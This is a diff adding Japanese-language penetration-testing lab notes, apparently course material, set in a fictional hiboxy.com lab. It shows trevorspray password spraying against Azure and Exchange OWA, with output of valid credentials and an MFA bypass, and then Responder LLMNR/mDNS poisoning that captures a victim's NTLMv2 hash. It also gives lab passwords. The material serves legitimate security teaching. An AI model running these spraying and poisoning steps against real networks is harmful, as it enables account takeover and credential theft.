@@ -4220,3 +4220,197 @@ sec560@560vm:~/Downloads/users$
 `[SUCC] slopez@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.`
 
 `[SUCC] MFA bypass (Exchange Online Powershell) enabled for slopez@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!`
+
+スマートロックアウトにより、結果が異なる場合があります。サンプル出力では、abates@hiboxy.com がログイン応答として AADSTS50131: 正しいパスワードですが、ログインがブロックされました を受信したことが確認できます。つまり、ログインはできませんが、パスワードは正しく、ユーザーは何らかのクラウドリソースへのアクセス権限を有しています。
+
+トレバースプレーはその後、有効な認証情報を他のエンドポイントに対して使用し、MFAが必要かどうかを確認するため、いくつかの別の手法を試みます。その結果、Exchange Online PowerShellがMFAのバイパス手段であることを特定しました！また、結果を~/.trevorsprayに保存するため、結果を簡単に見つけて再利用できる点にも注目してください。
+
+では、Exchangeサーバーを標的にしましょう。覚えておいてください、ラボ2.1ではhttp-auth-finder.nse NSEスクリプトを使用してExchangeサーバーのログインページを見つけ、GoWitnessでスキャンした際にOWAページを確認しました。Trevorsprayを使用して、オンプレミスのExchange OWAに対してパスワードスプレー攻撃を実行しましょう。
+
+偵察中に、TrevorsprayがExchangeの自動検出エンドポイントを見つけました。これをOWAモジュール（`-m owa`）でターゲットとするURL（`--url`）として提供します： 
+
+```
+sec560@560vm:~/Downloads/users$ trevorspray -m owa --url "https://autodiscover.hiboxy.com/autodiscover/autodiscover.xml" -u users.txt -p 'Password1'
+[INFO] Command: /usr/local/bin/trevorspray -m owa --url https://autodiscover.hiboxy.com/autodiscover/autodiscover.xml -u users.txt -p Password1
+[INFO] Spraying 21 users * 1 passwords against https://autodiscover.hiboxy.com/autodiscover/autodiscover.xml at Fri Mar  6 06:52:14 2026
+[WARN] NOTE: OWA typically uses the INTERNAL username format! Often this is different than the email format.
+[WARN] This means your --usernames file should probably contain INTERNAL usernames
+[WARN] Depending on the OWA instance, the usernames may also need the domain like so: "CORP.LOCAL\USERNAME"
+[WARN] You can discover the OWA's internal domain with --recon
+[WARN] If this isn't what you want, consider spraying with the "msol" or "adfs" module instead.
+[INFO] Using OWA URL: https://autodiscover.hiboxy.com/autodiscover/autodiscover.xml
+[SUCC] Found internal domain via NTLM: "hiboxy.com"
+[SUCC] 
+{
+    "NetBIOS_Domain_Name": "HIBOXY",
+    "NetBIOS_Computer_Name": "MAIL01",
+    "DNS_Domain_name": "hiboxy.com",
+    "FQDN": "mail01.hiboxy.com",
+    "DNS_Tree_Name": "hiboxy.com"
+}
+
+[INFO] abates@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] alee@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] aparker@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[SUCC] bgreen@hiboxy.com:Password1 - Valid credential!
+[INFO] bking@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] bsanchez@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] bwebster@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] hmarsh@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] janderson@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[SUCC] jcooper@hiboxy.com:Password1 - Valid credential!
+[INFO] jlopez@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] jmartin@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] kacevedo@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] mhernandez@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] mlara@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] mluna@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] nlopez@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] rduran@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] rgray@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[VERB] Waiting for proxy threads to finish
+[INFO] slopez@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] ssmith@hiboxy.com:Password1 - [<Response [401]>] (Length: 0)
+[INFO] Finished spraying 21 users against https://autodiscover.hiboxy.com/autodiscover/autodiscover.xml at Fri Mar  6 06:52:38 2026
+[SUCC] bgreen@hiboxy.com:Password1
+[SUCC] jcooper@hiboxy.com:Password1
+[INFO] 2 valid users written to /home/sec560/.trevorspray/existent_users.txt
+[INFO] 2 valid user/pass combos written to /home/sec560/.trevorspray/valid_logins.txt
+sec560@560vm:~/Downloads/users$ 
+```
+
+## Lab 2.4: Responder
+
+### Linux
+
+#### 1: Launch Responder
+
+Linuxでターミナルプロンプトを開きましょう。Responderが特権ポート（デフォルトでは<1024）をリッスンするにはroot権限が必要なので、sudoを使用してroot権限に昇格させます。Responderは/pentest/exploitation/responderにあります。
+
+```
+sec560@560vm:~/Downloads$ sudo Responder.py -I eth0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [192.168.80.129]
+    Responder IPv6             [fe80::20c:29ff:fee6:8dbe]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-O7STLDYQPB6]
+    Responder Domain Name      [AYBZ.LOCAL]
+    Responder DCE-RPC Port     [49747]
+
+[*] Version: Responder 3.1.7.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+[*] To sponsor Responder: https://paypal.me/PythonResponder
+
+[+] Listening for events...
+
+[!] Error starting TCP server on port 80, check permissions or other servers running.
+[!] Error starting SSL server on port 5986, check permissions or other servers running.
+[!] Error starting SSL server on port 443, check permissions or other servers running.
+[!] Error starting SSL server on port 636, check permissions or other servers running.
+[!] Error starting TCP server on port 53, check permissions or other servers running.
+[*] [LLMNR]  Poisoned answer sent to fe80::223a:fb6a:9c9e:929e for name SEC560-Windows
+[*] [LLMNR]  Poisoned answer sent to 192.168.80.128 for name SEC560-Windows
+```
+
+### Windows
+
+#### 2: Switch to Windows machine
+
+被害者となるWindowsマシンに切り替えます。ここで、clarkユーザーとして、パスワードQwerty12を使用してログインします。
+
+Windows VM からログアウトします。左下の Windows アイコンをクリックし、ユーザー アイコン（小さな頭と肩のアイコン）をクリックします。次に「サインアウト」をクリックします。
+
+次に、以下の認証情報でログインしてください：
+
+    ユーザー名: clark
+    パスワード: Qwerty12
+
+#### 3: Opening Explorer window
+
+スタートメニューの検索機能を使って、存在しないネットワークリソースを検索してみましょう。Windowsは存在しないシステムへのSMB接続を開こうとします。覚えておいてください、これはLLMNRリクエストをトリガーします。WindowsマシンはマルチキャストLLMNRリクエストを使用してホスト名を解決しようとするからです。レスポンダーが応答するのは、まさにこの種のリクエストなのです！
+
+Windows VM上でClarkとしてログインし、\\windows01へのSMBセッションを試行します。
+
+(WIN+Sのキーコンビネーションを使用すれば、以下の手順3に直接進むことができます。)
+
+    「スタート」をクリック
+
+    スタートメニューの上部にあるWindows検索ボックスをクリックしてください。
+
+    検索ボックスに\\windows01と入力し、Enterキーを押します
+
+接続が数秒間停止した後、「アクセスが拒否されました」と表示され、認証情報の入力を求められます。
+
+この時点で、Windowsマシンは既に現在のWindowsセッションの認証情報を使用してサインオンを試みていることに留意することが重要です。したがって、レスポンダーは既にNTLMv2チャレンジレスポンスを取得できているはずです...
+
+Windowsが複数回認証を行うと、このダイアログが表示されます。閉じても構いません。ハッシュ値は既に取得済みです！
+
+#### 4: Review NTLMv2 challenge/response hash
+
+```
+[SMB] NTLMv2-SSP Client   : 192.168.80.128
+[SMB] NTLMv2-SSP Username : SEC560-WINDOWS\clark
+[SMB] NTLMv2-SSP Hash     : clark::SEC560-WINDOWS:3c1caa40ebfcc720:4885AC3580FE7726945B4B024C84DC2D:01010000000000008059973636ADDC01560E8F9265A8A71B00000000020008004100590042005A0001001E00570049004E002D004F003700530054004C0044005900510050004200360004003400570049004E002D004F003700530054004C004400590051005000420036002E004100590042005A002E004C004F00430041004C00030014004100590042005A002E004C004F00430041004C00050014004100590042005A002E004C004F00430041004C00070008008059973636ADDC01060004000200000008005000500000000000000000000000002000009227811C8B38913C0F7529B62F8DAAA96A16B1D792FA93AD0F7C82D927E331187E728DDA270BE6C5DDF9493F3BE2C86BAFC3BE329E98D20796EACE7B7B1D8B170A0010000000000000000000000000000000000009001C0063006900660073002F00770069006E0064006F0077007300300031000000000000000000
+[*] [MDNS] Poisoned answer sent to 192.168.80.1    for name windows01.local
+[*] [MDNS] Poisoned answer sent to fe80::ca45:17d3:9f95:ceea for name windows01.local
+[*] Skipping previously captured hash for SEC560-WINDOWS\clark
+[*] [MDNS] Poisoned answer sent to 192.168.80.1    for name wpad.local
+[*] [MDNS] Poisoned answer sent to fe80::ca45:17d3:9f95:ceea for name wpad.local
+[*] [MDNS] Poisoned answer sent to 192.168.80.1    for name wpad.local
+[*] [MDNS] Poisoned answer sent to fe80::ca45:17d3:9f95:ceea for name wpad.local
+
+
+```
